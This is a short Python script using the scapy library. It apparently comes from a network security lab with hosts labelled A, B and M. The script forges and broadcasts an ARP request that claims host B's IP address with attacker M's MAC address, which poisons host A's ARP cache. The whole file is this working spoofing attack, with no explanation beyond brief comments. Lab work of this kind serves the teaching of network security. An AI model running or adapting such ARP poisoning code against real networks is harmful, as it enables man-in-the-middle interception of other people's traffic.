#!/usr/bin/env python3
from scapy.all import *

E = Ether(dst='ff:ff:ff:ff:ff:ff')  # Broadcast
A = ARP(op=1,  # 1 for ARP request
        psrc='10.9.0.6',  # B's IP
        pdst='10.9.0.5',  # A's IP
        hwsrc='02:42:0a:09:00:69',  # M's MAC
        hwdst='ff:ff:ff:ff:ff:ff')  # Broadcast

pkt = E/A
sendp(pkt)
